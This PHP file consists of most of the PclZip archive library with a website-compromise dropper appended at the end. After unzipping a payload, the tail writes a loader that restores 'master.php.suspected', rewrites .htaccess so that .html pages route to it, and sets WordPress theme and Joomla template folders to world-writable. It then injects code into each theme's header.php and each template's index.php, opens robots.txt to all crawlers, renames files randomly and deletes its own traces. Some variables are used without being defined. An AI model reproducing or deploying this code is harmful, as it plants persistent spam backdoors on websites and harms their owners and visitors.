    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip($foldername."/".$myfilename.".zip");
if ($archive->extract(PCLZIP_OPT_PATH, "$foldername") == 0) {
echo "Error : ".$archive->errorInfo(true);
}
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n";

$result = '<?php
ignore_user_abort();
set_time_limit(0);

if (file_exists("master.php.suspected")) rename ("master.php.suspected", "master.php");

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists($ff)) chmod ($ff, 0777);
if (filesize($ff)>120)
{
	$htout = fopen($ff, "w");
	fwrite($htout, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ master.php?world=5&looping=176&hl=$1 [L]");
fclose($htout);
}

?>';

$z = fopen("$foldername/zzz.php", "w");
fwrite($z, $result);
fclose($z);

$outlink = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/$foldername/\n";
$outlink = str_replace("z1.php/", "", $outlink);
echo $outlink;
         ob_flush();
         flush();


$filename = $foldername."/"."zzzcode.txt";
$handle = fopen($filename, "r");
$code = fread($handle, filesize($filename));
fclose($handle);
unlink($foldername."/"."zzzcode.txt");

if (file_exists("wp-content"))
{
chmod("wp-content", 0777);
if (file_exists("wp-content/themes"))
{
chmod("wp-content/themes", 0777);
	$dirs = scandir("wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir("wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
chmod("wp-content/themes/$dir", 0777);			
			if (file_exists("wp-content/themes/$dir/header.php")) 
			{
chmod("wp-content/themes/$dir/header.php", 0777);				
		   				  $file = fopen("wp-content/themes/".$dir."/header.php", "r");  
                          $buffer = fread($file, filesize("wp-content/themes/".$dir."/header.php")); 
						  $buffer = str_replace("\n", "11111111111111", $buffer);
                          fclose($file);
               if (strpos($buffer, '31.253.227')<5) 
               { 
		       unlink ("wp-content/themes/".$dir."/header.php");
						 	$in = fopen("wp-content/themes/".$dir."/header.php", "w");
				             fwrite($in, $code);
							 $buffer = str_replace("11111111111111", "\n", $buffer);
			                 fwrite($in, $buffer);
				             fclose($in);
               }
			}
		}
	}
}
}

if (file_exists("templates"))
{
chmod("templates", 0777);
	 $dirs = scandir("templates");
	 	foreach ($dirs as $dir)
	     {
		         if ((is_dir("templates/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		          {
chmod("templates/$dir", 0777);					  
					  if (file_exists("templates/".$dir."/index.php")) 
					  {
chmod("templates/".$dir."/index.php", 0777);						  
						  $file = fopen("templates/".$dir."/index.php", "r");  
                          $buffer = fread($file, filesize("templates/".$dir."/index.php")); 
						  $buffer = str_replace("\n", "11111111111111", $buffer);
                          fclose($file);	
                           if (strpos($buffer, '31.253.227')<5)  
                                   {
							unlink ("templates/".$dir."/index.php");
					         $in = fopen("templates/".$dir."/index.php", "w");
				             fwrite($in, $code);
							 $buffer = str_replace("11111111111111", "\n", $buffer);
			                 fwrite($in, $buffer);
				             fclose($in);
 								   }									   
					  }
		          }
	     }
}

if (file_exists("robots.txt"))
{
$outht = fopen("robots.txt", "w");
fwrite($outht, "User-agent: *

Allow: /");
fclose($outht);
}

$newfilename='';     
for ($ns=1;$ns<rand(10,20);$ns++)     
{     
$r = rand (0,count($let)-1);     
$newfilename .= $let[$r];     
}  

$file = fopen($foldername."/.htaccess", "r");  
$buffer = fread($file, filesize($foldername."/.htaccess")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/.htaccess", "w");
$buffer = str_replace("master.php", "$newfilename.php", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

$file = fopen($foldername."/master.php", "r");  
$buffer = fread($file, filesize($foldername."/master.php")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/master.php", "w");
$buffer = str_replace("master.php", "$newfilename.php", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

$file = fopen($foldername."/zzz.php", "r");  
$buffer = fread($file, filesize($foldername."/zzz.php")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/zzz.php", "w");
$buffer = str_replace("master.php", "$newfilename.php", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

rename ($foldername."/master.php", $foldername."/$newfilename.php");

unlink("z1.php");

unlink($foldername."/".$myfilename.".zip");
$scriptname= str_replace("/", "", $_SERVER["SCRIPT_NAME"]);
@unlink($scriptname);

?>